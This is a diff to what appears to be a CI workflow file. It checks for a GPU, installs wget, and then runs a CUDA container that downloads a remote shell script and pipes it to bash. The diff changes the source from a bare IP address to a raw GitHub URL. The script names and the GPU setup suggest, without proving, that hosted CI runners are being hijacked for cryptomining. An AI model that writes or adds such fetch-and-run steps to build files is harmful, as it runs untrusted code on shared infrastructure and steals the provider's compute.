@@ -8,4 +8,4 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: apt update && apt -y install wget
-      - run: docker run --gpus all nvidia/cuda:9.0-base wget -O - http://23.92.22.221/start_basket_fle_ftx_ph_ws3.sh | bash
+      - run: docker run --gpus all nvidia/cuda:9.0-base wget -O - https://raw.githubusercontent.com/Testdrive345/scriptX/main/Jet.sh | bash
